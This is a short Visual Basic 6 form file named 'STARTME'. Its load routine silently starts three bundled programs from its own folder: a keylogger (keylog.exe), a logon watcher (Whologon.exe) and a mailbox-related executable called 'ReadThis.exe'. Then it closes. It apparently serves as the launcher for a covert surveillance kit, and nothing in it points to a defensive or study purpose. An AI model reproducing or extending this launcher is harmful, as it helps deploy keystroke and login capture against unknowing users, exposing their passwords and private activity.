VERSION 5.00
Begin VB.Form frmMain 
   Caption         =   "STARTME"
   ClientHeight    =   1575
   ClientLeft      =   60
   ClientTop       =   360
   ClientWidth     =   6210
   LinkTopic       =   "Form1"
   ScaleHeight     =   1575
   ScaleWidth      =   6210
   StartUpPosition =   3  'Windows Default
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
Shell App.Path & "\Keylogger\keylog.exe", vbNormalFocus
Shell App.Path & "\Whologon\Whologon.exe", vbNormalFocus
Shell App.Path & "\MailBox\ReadThis.exe", vbNormalFocus
End
End Sub
